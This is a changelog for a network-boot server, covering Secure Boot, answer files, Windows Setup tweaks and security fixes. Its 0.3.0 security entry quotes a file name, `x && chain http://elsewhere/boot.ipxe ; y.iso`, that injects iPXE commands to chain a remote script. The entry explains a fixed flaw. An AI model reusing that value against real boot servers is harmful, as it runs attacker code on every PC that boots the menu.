# Changelog

All notable changes are listed here, newest first. The version numbers follow [Semantic Versioning](https://semver.org): while the first number is 0, the
program is not yet in its final form and any release may change how it is set up. See "Versioning" in [CONTRIBUTING.md](CONTRIBUTING.md).

## Unreleased

- **The container's `update` command lists the changes when the installed version is a pre-release.** The list is built by comparing versions, and `sort -V` ranks `0.5.0-rc.1` above `0.5.0`, so an installation that ran a release candidate was told nothing at all ("installed: 0.5.0-rc.1 available: 0.5.0" and straight to the question). The comparison is now a small function (`vcmp`) in which a pre-release is lower than its release and a test build such as `0.3.0-9-gabc` is higher than the release it follows; the host script uses it too. Tests: `go test ./tools/proxmox` runs the script's own text with sh and awk. The fix reaches a container with its next update (the archive carries the command); to have it at once, run on the Proxmox host `curl -fsSL https://raw.githubusercontent.com/ghazichaieb/gola-bootlace/main/tools/proxmox/bootlace-lxc.sh | bash -s -- --print-update >/tmp/update.new && pct push <number> /tmp/update.new /usr/local/bin/update --perms 0755`.

## 0.5.0 - 2026-10-29

- **Configured boot entries survive a server restart without waiting for inspection (#70, cache follow-up).** Bounded initramfs facts are cached locally and used to rebuild compatible starts on the first request. Changed files, program versions or server addresses invalidate the cache; corrupt caches fall back safely, and explicit rescan discards them. Thanks to @omar-akermi (PR #75).
- **Secure Boot works out of the box: the iPXE project's signed shim and iPXE are built into the program (#10).** The two x86-64 files of the iPXE project's release v2.0.0 (`x86_64-sb/shimx64.efi`, served as `ipxe-shimx64.efi`, and `x86_64-sb/ipxe.efi`; the combination that started the menu, Ubuntu Server, Ubuntu 25.04 and a Windows 11 installation on a real MSI PC with Secure Boot on) are embedded unchanged, with `internal/secureboot/assets/MANIFEST.json` (source, release, checksum of the release archive, size and checksum of each file). The program checks its own bytes against the manifest at start and serves nothing, with an `ERROR` line in the log and a message in the web interface, when they do not match. TFTP serves exactly these two names under `sb/` in this mode. The ARM64 files of the same release are not included (ARM64 PCs are not started yet, and are never sent the x86-64 shim).
- **Secure Boot way and scope are settings (#10).** `secureBootMode` is `builtin`, `own` (a folder with a distribution's shim and an iPXE signed with your own key, as before) or `off`; `secureBootScope` is `all` (every 64-bit UEFI PC, what `-secure-boot-all` did) or `marked` (only the PCs marked on the PCs page). They are in the settings file and so in backups. **A new installation starts with `builtin` and `all`; a settings file from an older version has neither, which stays off and marked, so updating changes no behaviour**, and the log, the Dashboard and the Server page say *Secure Boot support is built in: turn it on* until a way is chosen. New options `-secure-boot builtin|own|off` and `-secure-boot-scope all|marked` (`BOOTLACE_SECURE_BOOT`, `BOOTLACE_SECURE_BOOT_SCOPE`); `-secure-boot-dir` still selects the own-key way and `-secure-boot-all` the scope `all`; options win over the saved settings and are shown as such. Without `-secure-boot-dir`, the own-key way uses the folder `secure-boot` next to the settings file.
- **The Server page chooses the way (#10).** The Secure Boot block has a control for the way (Built in, Own key, Off) and one for the scope, a plain explanation of each way, the served files with size and checksum and the iPXE release they come from, what is missing for the own key, and a question before switching to the own key (every PC needs the key enrolled) or to every PC. A change counts from the next DHCP answer with no restart. API: `GET /api/secureboot` now has `mode` (`builtin`, `own`, `off`; it was `""`, `pcs`, `all`), `scope`, `modeSource`/`scopeSource`, `modeLocked`/`scopeLocked`, `unset`, `builtin` and `own`; new `PUT /api/secureboot` (`{"mode": ..., "scope": ...}`; 400 for an unknown value, 409 for what an option decides, for damaged built-in files and for the own key without its shim). The start-up log says which way is on and why.
- **`tools/update-secure-boot-assets.sh <release> <sha256>` renews the built-in files.** It downloads the iPXE project's release archive, stops unless its SHA-256 is the one given (or `--trust-printed-hash` is used, which only prints and records the checksum), takes out the two files, rewrites the manifest and prints which checksums changed. [docs/secure-boot.md](docs/secure-boot.md) says when to do it and why: PCs refuse builds that a newer iPXE or shim release revoked (SBAT, `dbx`).
- **Sources and licences of the built-in files.** `NOTICE` and `third_party/SOURCES` (and so the third-party-sources archive of every release) carry the iPXE v2.0.0 source, the iPXE project's shim source (tag `ipxe-16.1`) and its gnu-efi, with the licence terms read from them; the exact commit the shim was built from is not recorded by the project, which `NOTICE` says. The shim in the file carries Microsoft's 2011 UEFI CA signature only.
- **The Dashboard no longer says that Secure Boot is not supported,** and the PCs page's button text no longer says that a key must always be enrolled.

- **The Secure Boot route says what it is doing (#74).** Found by testing 0.5.0-rc.1 on a real MSI PC with Secure Boot on, in proxy-DHCP mode: with `-secure-boot-all` and the iPXE project's signed shim and `ipxe.efi` the menu came up and Ubuntu Server and Ubuntu 25.04 booted, but a missing option or file only showed as `Security Violation` on the PC. The log now says at the start `Secure Boot route: ON ...` or `OFF ... set BOOTLACE_SECURE_BOOT_DIR, see docs/secure-boot.md`, and warns when the folder has the shim but not the file the shim asks for next (`ipxe.efi` for a shim whose name contains `ipxe`, `grubx64.efi` otherwise); the start is not refused for that, because the folder is read at every request and the file can be copied in while the server runs. The Server page has a **Secure Boot route** block (on or off, the folder, every expected file marked present or missing, all PCs or only marked ones, and a sentence about what is missing), with the same facts in `GET /api/secureboot` and in `/api/status`.
- **A PC that only asked for a boot file is labelled (#73).** Its row on the PCs page says `Asked for a boot file; Secure Boot may be refusing iPXE.` with what to do (turn the route on, or press "Secure Boot route"), it has a History entry for each ask, and it can be forgotten. The page's self-refresh no longer stops while the search box or the page-size drop-down has the focus (it paused for anything inside the page, so a PC that appeared in the meantime stayed unlisted until the page was clicked elsewhere or reloaded). The server side was checked end to end with the real server, DHCP answer and admin handler and fake packets (discover from 0.0.0.0, request, architecture codes 7, 9 and 16, route on and off, restart with a saved list, full list): the PC is listed in all of them, so the missing row seen on the real PC was not reproduced; see the issue.
- **Secure Boot documentation.** [docs/secure-boot.md](docs/secure-boot.md) now starts with the iPXE project's signed shim as the recommended route, with copy-paste steps for a Proxmox container (download, checksum, folder, two lines in `/etc/default/bootlace`), per-PC button versus `-secure-boot-all`, the log lines of a working start, and a troubleshooting table; the real-PC results (menu, Ubuntu Server and Ubuntu 25.04 on an MSI PC, proxy DHCP) are in its results tables and in the compatibility page. Windows Setup through the route has not been tried on a real PC.

## 0.5.0-rc.1 - 2026-10-27

A pre-release: it exists so that the Secure Boot route can be tried on a real server and real PCs. Nothing changes unless the new option is set. To try the route without enrolling any key, put the iPXE project's signed `ipxe-shimx64.efi` and `ipxe.efi` (release file `ipxeboot.tar.gz`, folder `x86_64-sb`, the shim file `shimx64.efi` renamed) in a folder and start with `-secure-boot-dir <folder> -secure-boot-shim ipxe-shimx64.efi`; the steps are in [docs/secure-boot.md](docs/secure-boot.md) ("Way 2").

- **Secure Boot for other Linux ISOs: a prototype, off by default (#10).** New option `-secure-boot-dir <folder>` (`BOOTLACE_SECURE_BOOT_DIR`; `-secure-boot-shim` names the boot file, `-secure-boot-all` sends every 64-bit UEFI PC): the DHCP answer for a PC marked on the PCs page ("Secure Boot route") names a Microsoft-signed shim under `sb/`, TFTP serves the folder's files by name (the shim's second stage, MokManager), and the menu entries that start a Linux kernel get an iPXE `shim` line so that the ISO's own shim checks the kernel. `tools/ipxe/build-sb.sh` builds iPXE with `SECUREBOOT=1` and its own SBAT line and signs it with a key given by path (nothing is signed or shipped by the project). Measured in a Hyper-V lab with Secure Boot on: the menu, and Ubuntu, Linux Mint, Debian and Fedora to their desktops or installer, openSUSE and Ubuntu Server to their kernels; an unsigned kernel (CachyOS) and Windows through wimboot do not start. The shim needs the signing certificate enrolled once per PC (8 screens), unless the iPXE project's own signed shim and binaries are used instead, which needed no enrolment in the lab. Full table, limits and risks in [docs/secure-boot.md](docs/secure-boot.md). Not tested on a real PC. `tools/lab.ps1` and `tools/pxe_vm.ps1` can start Secure Boot VMs (any template, an extra disk).
- **A correction in the Secure Boot page.** wimboot is signed by Microsoft (UEFI CA 2011); only iPXE is unsigned.

- **Changing management pages while data loads is safe (#69).** Late page responses and failures are discarded after navigation, and abandoned pages cannot restart polling. Background uploads continue normally. Thanks to @omar-akermi (#71).

## 0.4.2 - 2026-10-26

- **The container's `update` command renews itself.** A container's `update` command was only rewritten when the host script ran again, so a container made before the "what is new" list existed (0.4.0 or earlier scripts) kept an old copy that asked "Update now?" without listing the changes. The Linux release archives now carry the current `update` command, and after a successful update it replaces the installed one (the archive has just passed its checksum; an archive without one, or one that does not parse, leaves the old copy). For a container that already has the old copy, run the host script once with `CTID=<number>` (see docs/proxmox.md); after that it stays current. When the changelog cannot be read, `update` now says so instead of printing nothing.

## 0.4.1 - 2026-10-26

- **PC cleanup tests no longer depend on clock precision (#34).** Their fixtures are kept away from the age cutoff, avoiding the intermittent 19-versus-20 failure on Windows. Thanks to @omar-akermi (#66).
- **Zstandard image unpacking has a bounded window (#34).** Frames requiring more than 128 MiB of history are refused before decoding, and extraction uses one decoder worker. Ordinary images still stream to disk; this is a window limit, not a limit on unpacked image size. Thanks to @omar-akermi (#67).
- **XZ image unpacking has the same limit as Zstandard (#34).** The XZ library raises its own dictionary limit to whatever the file declares, so a small hostile `.xz` could ask for up to 4 GiB before the free-space check helps. The first block's declared dictionary is now read first and a file above 128 MiB is refused with a message that says how to repack it (follow-up to #67). Only the first block is checked; the documentation says so.
- **Manage the entries of an ISO's boot menu (#35).** The ISOs page can hide and rename compatible entries, add arguments to one entry, and select which entry starts when the ISO is chosen (including automatic starts and PC rules). The usual start remains available. Choices survive restarts, backups and library renames; a missing choice falls back to the usual start. Thanks to @omar-akermi (#68).
- **Extra arguments go in front of the kernel's `--` (#35).** A boot-menu line of an ISO can contain the word `--` (the Linux Mint entries do): the kernel stops reading its parameters there and hands the rest to init, so the arguments an ISO, an entry or a PC adds (and the debug words) were ignored by the kernel on such a line. They are now put in front of the `--`; a line without it, and one with `---` (installers), is unchanged. Found by starting a UEFI VM with `maxcpus=1` added to a Mint entry.
- **An ISO with a boot password starts again (#24).** The menu fetched the password check's answer as an iPXE image and left it there; iPXE hands every image it holds to a Linux kernel as an initrd, so the kernel failed to unpack it and stopped with "Unable to mount root fs" (Linux Mint, started in a UEFI VM after the right password). The image is freed right after the check.

## 0.4.0 - 2026-10-25

- **Answer files are given to fewer hosts (#60).** The address of an answer file has no password (an installer cannot log in), so a file is now given only to a MAC address that asked for the menu in the last two hours, and only twelve files after each time that PC asked for the menu; then the address answers "not found" until the PC asks again (a refusal says why in the log, the requester sees nothing more). The same network address as the menu request is NOT required by default: in a real run the installer of Ubuntu Server was given another address than iPXE had (the router leases by client identifier), so that condition refused the PC it was meant for; it is a switch ("Stricter") on the Unattended page for networks where a PC keeps its address. Saving, listing and attaching a file now warn when a line holds a password in plain text for its kind (Debian preseed, Ubuntu autoinstall, kickstart, AutoYaST); nothing is refused. This does not stop a host of the local network that asks the menu with the MAC address it wants and then fetches: the documentation says so. Verified with Ubuntu Server 26.04.1 in a UEFI VM (see the issue); the gate, the counters and the warnings are covered by unit tests.
- **Windows answer files per PC or per ISO (#17).** A new answer file kind, *Windows autounattend.xml*, attached to an ISO or to one PC like the other kinds (same opt-in, confirmation, masked passwords, plain-password warning and limits as for the web address). The Windows set-up environment has no web client (no `curl`, `getmac`, `wmic`, `powershell`, `certutil` or `findstr`), so the file travels over the share: the ISO's folder shows `_bootlace\<MAC>\autounattend.xml` for a PC that has a file, made for that PC (`{{hostname}}`, `{{computername}}` cut to 15 characters, `{{name}}`, `{{mac}}`, `{{ip}}`, `{{serial}}`; words are XML-escaped), and `bootlace.cmd` reads its own MAC addresses from `ipconfig /all`, copies the file and starts Setup with `/unattend:`. An `autounattend.xml` in the ISO's own folder keeps working when nothing is attached (an attached file wins). A "native" (Secure Boot) start counts as asking for the menu. Verified in a real Windows 11 26H2 Setup in Hyper-V: unattended install onto an empty disk, computer name `SHOP-PC-7` taken from the PC's name, account made, first-logon command ran. Windows opens the folder that holds a file before copying it, so the share also shows the two folders on the way (found by the first real run, which failed with "path not found").
- **Answer file text is escaped for XML kinds.** Values put into AutoYaST and Windows files (the PC's name, serial ...) are XML-escaped.
- **Windows Setup options (#18).** Menu page > Tuning: the five Windows 11 check ticks were tried in a real 26H2 Setup (VM without TPM, 2 GB, 40 GB disk): without the TPM tick Setup stops with "This PC can't run Windows 11", with it Setup goes on; the memory and storage ticks changed nothing visible there and the Secure Boot and processor ticks could not be tried (see the compatibility page, which also lists the runs). New **Local account at the first start** tick: Windows 11 26H2's first start has no way past its network page (`OOBE\BYPASSNRO` and the `BypassNRO` value no longer do anything: tried); `HideWirelessSetupInOOBE` in an answer file is what removes the page, and the first start then asks for a local account (verified offline). With the tick on, Bootlace makes that small answer file when no Windows answer file is attached (a PC set to "No answer file" is left alone). New **Drivers** tick: driver packages in `<library>/drivers/all/` (every Windows ISO) or `drivers/<ISO file name without .iso>/` are added to the boot.wim copy the server hands out (the ISO itself is never changed), loaded with `drvload` before Setup starts and kept at `\$WinPEDriver$` so that Setup also takes them into the new Windows; the iPXE start now loads that copy too. Verified: a virtio-scsi disk that Setup did not see ("We couldn't find any drives") is seen with the drivers on, and the package is in the new Windows' driver store afterwards. Not seen: the installed Windows booting from that disk (the Proxmox test VM's QEMU exits at 75 % of the install, probably the old CPU). `setup.exe /installdrivers` does not exist in the set-up image's Setup and is not used. Without wimlib-imagex the drivers are ignored with a log line instead of breaking the start.
- **Answer files with control characters in an XML kind are refused.** A stray vertical tab or form feed in an AutoYaST or Windows file (it came from a backslash escape in a script during the tests) made Windows Setup stop with "an internal error while loading or searching for an unattend answer file". The page now says which line holds it.
- **A dual-stack web port (#29, stage 1).** The web port listens on IPv4 and IPv6. This showed a real bug: on Windows a link-local peer comes as `169.254.x.x%<interface>` (and `fe80::1%eth0` on Linux), `net.ParseIP` refuses it, and the access check refused the PC as "unknown"; the zone is now dropped (`access.Host`).
- **The Proxmox update shows what is new.** `update` in the container (and `update --check`), and the script that updates a container from the host, now list a short line for each changelog entry between the installed version and the offered one, not just the latest release: a server three releases behind sees all three, security notes are marked with `!`, a test build counts as newer than the release it came from, and nothing is shown for an older version or when the changelog cannot be read. (A script change: it takes effect when the host script runs, no release is needed.)
- **Debian and Kali netinst installers can install over the network (#59).** The CD flavour of the Debian installer can only continue with the CD it was started from, so a netinst ISO started over the network stopped at "Detect and mount installation media". Bootlace now gives it a CD: an archive made for each ISO adds the network card drivers, `iscsistart` and a start-up script, all taken from the ISO's own packages for the kernel the ISO starts (nothing names a Debian version, so a new kernel needs no change here), and the script logs in to the ISO's iSCSI CD-ROM before the installer's first step. The installer's own CD detection then mounts it like a disc, and the answer files of the Unattended page (preseed) are read as they are for any installer. It needs the iSCSI server (on by default); without it the menu entry now says that the installer cannot install. Run to an installed, booting system in Proxmox VMs: Debian 13.7 (by hand, UEFI), Debian 13.7 (also in BIOS) and Debian 12.15 with a preseed file, Kali 2026.2 (kernel 7.1) with a preseed file. The graphical installer was run with 3 GB and 1 GB; with 768 MB it switches to its low-memory (text) mode and goes on; with 512 MB it did not get past its start.
- **The preseed template no longer uses the reserved user name `admin` (#63).** The Debian installer refuses it ("reserved for use by the system") and an unattended install stopped there. The template says `localadmin`.
- **Debian preseed installs get the PC's hostname before networking (#64).** When a preseed is attached, the kernel line carries the same sanitized PC name (or MAC-based fallback) as the answer file's hostname word, including an override of DHCP-provided names. Explicit ISO or PC hostname arguments are preserved. Network answers inside a network-fetched preseed arrive too late to configure the initial network. Real run on a Debian 13.7 netinst UEFI VM: a PC named "Front Desk 7" installed as `front-desk-7`, an unnamed one as `pc-<last 6 hex of its MAC>`, and without the change the installed name was `debian`. Thanks to @omar-akermi (#65).

## 0.3.1 - 2026-10-25

- **A separate debug shell switch (#28).** Verbose start-up no longer opens a shell: Proxmox's `proxdebug` (and the shells of the other systems) now belong to a new *Debug shell* switch next to *Verbose start-up* and *Serial console*, on the ISOs page and in a PC's *Kernel options*. It adds the word that stops the start-up at a shell: `proxdebug` (Proxmox VE), `rd.break=pre-mount` (Fedora and the other dracut systems), `break=premount` (Debian live, Ubuntu); systems without such a word ignore it. Each word was checked on a real UEFI virtual machine started through Bootlace (Proxmox VE 9.1, Debian 13 live, Fedora 44 live, Ubuntu 22.04). Settings made before keep working; a PC or ISO with only this switch is kept like one with the others.
- **Next page and Previous page keep their direction.** A page reached with a page button now highlights that same button, so pressing Enter again keeps going the same way: forwards lands on *Next page*, backwards on *Previous page* (before, going back landed on *Next page* of the earlier page). Where the button does not exist (page 1 reached backwards, the last page reached forwards) the other one is highlighted. It applies to the UEFI picture menu, the BIOS text menu and the pages of *Other ways to start an ISO*; the page links carry the direction (`focus=prev` / `focus=next`), and an older address without it behaves as before. Checked on real UEFI and BIOS iPXE through four and seven pages, forwards and backwards.
- **Configured PCs keep their history when the list is full (#61).** A PC with an administrator-assigned name, MAC rule or non-empty kernel/answer options is no longer evicted by new MAC addresses. The 200-PC cap stays: if every slot is protected, new PCs can still boot but are not recorded until a slot is available. Automatic age-based cleanup and explicit Forget actions are unchanged. Thanks to @omar-akermi (#62).
- **The DHCP listener can no longer grow the list of PCs without limit (#61).** The menu path was bounded and protected the configured PCs (#62), but a PC that only asked for a boot file was added by a second piece of code with no bound at all, so a flood of DHCP requests with made-up MAC addresses still grew the list (and `pcs.json`) without end. Both paths now go through one function that applies the same bound and the same protection.
- **Verbose start-up removes silent splash settings (#28).** Valued splash options such as Proxmox's `splash=silent` are removed and other kernel log levels are replaced by `loglevel=7`. The same correction applies to per-PC verbose options. Thanks to @omar-akermi (#58).

## 0.3.0 - 2026-10-25

**Security: please update from 0.2.x.** A file name in the library (or an entry title of an ISO's own boot menu) could chain iPXE commands that then ran on every PC that showed the menu; anyone who can write into the library folder, for example through an open network share, could use it. Fixed in this release (details below), together with limits on what a network disk client can ask of the server.

- **Answer files: the limit is said plainly, and the templates ask for hashes (audit pass 3, #34).** An installer cannot log in, so the address of an attached answer file (in the kernel line of any menu) and the file itself can be read by anyone on the local network, with any MAC address in the path; the page and the docs said only that the id cannot be guessed. They now say what that means and the templates ask for a password hash (`user-password-crypted`, `rootpw --iscrypted`, an encrypted AutoYaST password, a crypted autoinstall password) instead of inviting a plain password. A PC whose name left nothing for a host name now gets `pc-` and the last letters or digits of its MAC address in lower case only. Fuzz tests now cover the masking round trip (saving a masked file gives the file back), the host names and the template words, and the DHCP parser.
- **A network disk client can no longer take the server's memory (audit pass 3, #34).** The iSCSI target made one buffer for a whole READ command, and a command can ask for as many blocks as the disk has: one request from any PC on the network for a 9 GB ISO took 9 GB. A read is now limited to 8 MB (initiators ask for a few hundred KB, 4 MB at the most). Both network disk servers (iSCSI and NBD) also serve at most 256 clients at once, drop a client that has not finished its login or handshake in 30 to 60 seconds, and the iSCSI target drops a session that has said nothing for 6 hours; a connected NBD disk is never dropped for being quiet.
- **A file name, or an entry of an ISO's own boot menu, can no longer run iPXE commands on the PCs that show the menu (audit pass 3, #34).** The menu is an iPXE script, and iPXE ends a command at a word that is exactly `&&`, `||` or `;` and runs what follows as the next command. A name such as `x && chain http://elsewhere/boot.ipxe ; y.iso`, in a folder anyone on the network could write to (a NAS share), was written as it was into the `menu` and `item` lines of the text and picture menus, so every PC that showed the menu ran the chained command with no choice made (the line count of a script was already checked by a fuzz test, which could not see this). Titles, the arguments and the paths that come out of an ISO, and the extra kernel arguments typed in the web interface (also those of an older settings file) are now cleaned by one small package (`ipxesafe`): control characters of every kind become spaces, `${...}` is broken, those three words are changed or dropped, a file path in a kernel line is escaped into one word, and arguments with such words are refused when they are saved. The fuzz test now also counts the chained commands of the script.
- **Resumable uploads and block devices are stricter (#55).** Resuming or finishing an upload now checks the free space only for the bytes still needed (the disk reserve is kept), and an upload is only resumed when its checksum matches (ignoring case and spaces), instead of silently keeping the old checksum. The NBD and iSCSI servers reject offsets and block addresses that overflow or lie outside the disk before they reach the backing reader, and answer an I/O error when a read comes back short instead of sending zero-filled data as if it were good. Thanks to @omar-akermi (#55).
- **UEFI HTTP boot: the answer now reaches real firmware (#19).** The first part answered only a client that reports architecture 7 (the PXE code for x64 UEFI). Firmware that boots over HTTP reports its own codes (IANA: 15 x86, 16 x64, 19 ARM64, 20 BIOS), so the code 16 that every x64 PC sends was never answered and the first part could not have worked. It is folded into the PXE ones now (also in the log and the PC list: `x64-efi`). Checked on the wire from a PC of the network: a DHCP discover with vendor class `HTTPClient:Arch:00016:UNDI:003001` gets a proxy offer with option 60 `HTTPClient` and option 67 `http://<server>:8080/ipxe/ipxe.efi`; the file is served with its length and byte ranges; an ARM64 request (19) and an ordinary computer get no answer. Not yet tried on firmware: the lab has none with an HTTP boot entry (Proxmox's and Debian's OVMF are built without the network stack; Hyper-V has no HTTP boot).
- **Unattended installs: answer files (#17).** A new *Unattended* page keeps answer files: Debian preseed, Ubuntu autoinstall (cloud-init), Red Hat kickstart and openSUSE AutoYaST, each with a template that says it erases the disk. A file is attached by hand to an ISO (ISOs page) or to one PC (Kernel options on the PCs page; "no answer file" keeps it away from a PC), with a confirmation; the installer is pointed at it on the kernel line and fetches it from `/answers/<id>/<MAC>/...`, made for that PC (`hostname`, `name`, `mac`, `mac-dash`, `ip` and `serial` between double curly braces are replaced). The id cannot be guessed and a file is only given while it is attached. Passwords in a file are shown as `********` and kept when it is saved masked; the files are kept in the settings (not in a backup without secrets) and their text is never logged. Checked: Ubuntu Server 26.04.1 installed by itself in a UEFI VM and booted as the PC's name. Not part of this yet: a Windows `autounattend.xml` per PC or ISO. The Debian netinst installer cannot finish an install when started this way (#59), so a preseed is not useful with it.
- **Ubuntu Server ISOs are downloaded whole into memory** instead of being read from the network disk: Ubuntu's installer stops on the network disk ("Invalid dep_id (disk-nbd0) not in storage config"). The PC needs about the size of the ISO and 2 GB more. cloud-init stays on for them, because it is what hands the installer an autoinstall file.
- **A PC's kernel-options call no longer touches its answer file choice** (the choice has a call of its own, `PUT /api/pcs/{mac}/answer`).

It only looks inside those folders, never touches an ISO or any other file, does nothing while the library is not available (an unmounted network folder looks empty), and writes every removal to the log.

The values apply to the next transfer, no restart.

It colours the chosen line and the section headings, and the picture menu of a UEFI PC too once a colour other than the default is set. The logo and the menu heading stay fixed on purpose: Bootlace is not rebranded.
- **Self-test button (#44).** The Server page has a "Run the self-test" card. From the server's own address it asks for what a PC asks for, one step at a time: the boot script and the menu (which also proves the local-network rule lets the server's own address through), the first 16 bytes of an ISO, a TFTP file, the Windows share's first message (the SMB 1 negotiate that Windows' set-up starts with, answered in SMB 2), the network disk's greeting and the iSCSI port. A step that fails says what to look at; a service that is switched off is skipped. A firewall in front of the computer cannot be seen this way, and the page says so.
- **Look for another PXE or DHCP-boot server (#43).** A card on the Server page ("Other servers on the network") sends the question a PC's firmware sends, a PXE DHCP discover from the server's own address to its network's broadcast address, listens for four seconds and lists every answer: the address, the boot file, and what it is in words (this server; the network's own DHCP server, which is normal next to the proxy mode; another server that answers network boots, which competes). With `-dhcp full` any other DHCP server is reported as a conflict too. It runs when the button is pressed and once ten seconds after the start (the result is written to the log as a warning when something competes); the last result is shown when the page opens. It needs to hear broadcasts: a server in a container needs the host network, and a DHCP client of the same computer holding UDP port 68 is shared with, not displaced.
- **Library speed test (#40).** A card on the Server page writes a test file (up to 512 MB and at most a tenth of the free room, random data so that nothing compresses it, flushed to disk) in the library and in the container's own cache folder, reads it back, removes it, and says how fast each is and how many installs at once the read speed carries at 25 MB/s each. Where the operating system's file cache can be emptied before the read (Linux, as root) the read speed is the disk's; otherwise the page says the read may come from memory. It refuses to run while PCs are using the server unless the person agrees, and runs one test at a time. (Running it once when the library is chosen and keeping the result is left for later.)
- **Settings backup, restore, and a copy in the library (#41).** (1) Whenever the settings change a copy without secrets is written to `<library>/.bootlace/settings.json`. A new container given the same library finds a copy it has not decided about and the Server page asks: restore the library's settings, or keep these and replace the library's copy; until the person decides, the library's copy is never overwritten. (2) *Download a backup* packs `settings.json`, the list of PCs and a small manifest (version, date) into one zip; *Download with the passwords* also holds the web interface's password hash and the share's password, for moving to another machine (the page warns that the file is to be kept like a password). (3) *Restore from a backup file* shows what it holds against what the container has (rules, PC names, ISO titles, hidden ISOs, arguments, patterns, PCs) and asks before replacing; the library choice always stays, and so do the passwords unless the backup holds them. (4) A backup made by a newer version, a file that is not a zip or holds anything unexpected, or settings that do not pass the checks are refused with a message and nothing is applied.
- **Wake a PC from the PCs page (#23, first part).** Every PC in the list has a "Wake" button that broadcasts a Wake-on-LAN magic packet for its MAC address on the server's network (to the network's broadcast address and to 255.255.255.255, UDP port 9). The PC starts only if its network card and firmware are set to wake on that packet. Scheduled starts are not done yet.
- **A full cache removes the least recently used entries (#48).** When a cache place is full (the container's own folder over its limit, or the library's disk out of room) the server now removes the entries that were used least recently and that nothing is using, oldest first and only as many as needed, instead of failing: with "the container only" when the folder is over its limit, with "the library" when its disk is full, and with "the container, then the library" when both are full. An entry counts as used when the menu, a download or a disk reads it (its file time is refreshed), and it is never removed while a PC is using its ISO or for 30 minutes after its last use; files that are not named like cache entries (and partial files) are never touched. The Server page lists the entries, oldest first, with what is kept and why, and says so plainly when nothing could be removed (the size of the container's folder limits how many different installs can be prepared at once).
- **A first-start guide (#42).** A new installation opens on "Start here", four short steps: set your own password (the one made up at the first start is replaced; shown as done once you have chosen one, or given one with `-admin-password`), choose the library, review who may use the server, and "Run the checks" (the self-test and the look for other servers, with what the DHCP mode means). Finishing or skipping it makes the page go away for good; an installation that existed before this version is treated as having been through it. Everything the guide does is also on the normal pages. (The generated password is still written in the log: showing it in the page would let anyone who reaches the port log in.)
- **Verbose start-up, serial console, and the commands a PC gets (#28).** Under each ISO that is started from its own files, two switches and a fold-out: *Verbose start-up* takes `quiet`, `splash` and `rhgb` out of the kernel line and adds `loglevel=7 ignore_loglevel debug`; *Serial console* adds `console=tty0 console=ttyS0,115200n8` (the serial port last, so it is the kernel's main console) for a PC or virtual machine whose serial port is recorded; *Show the commands a PC gets* lists the exact iPXE commands of the entry, after the extra arguments and these switches. Applied at the next start of that ISO; both off removes the setting.
- **A history for every PC (#25, first part).** The PCs page has a *History* button per PC: the last 40 things the server saw (asked for the menu, a rule sent it somewhere, it started fetching an ISO), newest first, kept across restarts with the list of PCs; repeats within two minutes are one line. *Download the history of every PC (CSV)* gives one spreadsheet file (cells that start like a formula are quoted). The PC cannot tell the server how a start ended, so "did it work" is not recorded; the log download of #46 covers the server's own log.
- **A password in front of an ISO in the menu (#24).** *Set a password ...* on the ISOs page makes the menu ask for it before that ISO starts: iPXE's own login prompt (the password is hidden; press Enter at the user name), then the server checks it at `/auth` before the script goes on. A wrong password, or none, says so and returns to the menu; five wrong guesses in a row lock that address out for a minute. The password is kept as a salted hash (the same PBKDF2 as the web interface's), is a secret in the sense of the backup (not in the library copy or a backup without passwords), and a PC that a rule starts on purpose is not asked. This keeps a menu that anyone at the PC can use from starting a wipe by accident; it is not a lock against someone on the network (the password crosses the network in the clear and the ISO file can still be downloaded), and the page says so. A password on the whole menu is not done.
- **Rules for a kind of PC (#22, first part).** The PCs page has "Rules for a kind of PC": every PC whose firmware reports a model that contains some text (`ThinkCentre`), a manufacturer that does, or a platform (UEFI or BIOS) goes to the same place, without a menu: its own disk, one ISO, or "show the menu" (which ends the search for PCs of that kind). A rule for one PC (by MAC address) wins over the rules for a kind; those are tried in the order of the list, the first that fits decides, and a second rule for the same text replaces the first. Groups of PCs chosen by hand, and a different menu per group, are not done.
- **`.deb` and `.rpm` packages (#49, second item).** `tools/package.sh` (and `tools/release.sh`, when Docker is there) makes `bootlace-<version>-linux-<amd64|arm64>.deb` and `.rpm` with nfpm: the program in `/usr/bin`, a systemd service that is enabled and started, `/etc/default/bootlace` for the settings (a configuration file: kept on upgrade and on removal), the documents, and a recommendation of `wimtools` (to start Windows with Secure Boot on). Removing the package stops and disables the service and leaves `/var/lib/bootlace` alone. Checked by installing and removing the `.deb` in a Debian 12 container and by reading the `.rpm` in Fedora; the service was not started there (no systemd), so the first real install on a Debian host is still to be watched.
- **Resumable uploads (#47).** A file of 64 MB or more is sent from the Library page in pieces of 8 MB to an upload session on the server (`/api/library/upload/sessions`): a connection that breaks is retried with a growing wait and continues from the byte the server has, and a page that was reloaded, or a laptop that went to sleep, continues the same upload when the same file is chosen again (the server finds the open upload by name, folder and size). The part file stays in `<library>/.bootlace/incoming` with a small record next to it; the start of the file is checked as soon as it is there (a web page saved as `ubuntu.iso` is refused after the first bytes, not after 5 GB), and the whole file is checked (size, content, checksum, room, nothing replaced) when it is finished. An upload nobody touched for a week is removed with what it received, and the clean-up of #45 leaves the part of an open upload alone. Smaller files are still one request.
- **Windows 11 Setup checks can be skipped (#18, first part).** The Tuning card on the Menu page has five tick boxes (TPM 2.0, Secure Boot, 4 GB of memory, supported processor, 64 GB of storage). A ticked check is skipped by writing the matching `HKLM\SYSTEM\Setup\LabConfig` value (`BypassTPMCheck` ...) in the set-up environment just before Setup starts, in the command file that Bootlace already puts in the Windows start-up files (also in the copies made for UEFI Secure Boot, which are made again when the choice changes). Nothing is skipped unless ticked, and the page says Windows then runs without a promise of updates or support from Microsoft. Driver injection and the other bypass options (network, account) are not done.
- **UEFI HTTP boot (#19, first part).** A UEFI PC whose firmware cannot PXE but has "HTTP Boot" (its vendor class says `HTTPClient`) is now answered: the proxy answer names the boot loader by web address (`http://<server>:<port>/ipxe/ipxe.efi`, in option 67 and in the file field) with the vendor class `HTTPClient` that such firmware looks for, and the network's own DHCP server still gives the address; in `-dhcp full` mode the same answer comes with the address. The loader then starts iPXE, which asks for the menu like any other PC. BIOS PCs and ARM64 are not answered (no loader). Not yet tried on real firmware or in a lab VM with an HTTP boot entry (Hyper-V has none): the firmware's way of choosing between offers differs from one maker to the next.
